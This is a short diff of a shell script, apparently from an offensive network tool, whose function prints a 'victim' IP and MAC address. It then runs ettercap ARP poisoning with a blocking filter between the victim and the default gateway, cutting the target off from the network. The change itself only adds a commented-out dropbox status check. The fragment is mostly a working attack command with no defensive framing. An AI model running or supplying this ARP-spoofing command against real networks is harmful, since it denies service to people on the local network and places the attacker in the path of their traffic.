@@ -77,5 +77,6 @@ function blockAfterSelectIP {
   echo -e " ${YELLOW}Victim MAC: ${RED}"$victimMACAddress${WHITE}
 
   printf "Blocking network access from "$victimIPAddress
+  #until dropbox status | grep -q "100.0%";
   ettercap -T -q -p -F block.ef -M arp:remote /$victimIPAddress// /$defaultGateway//
 }
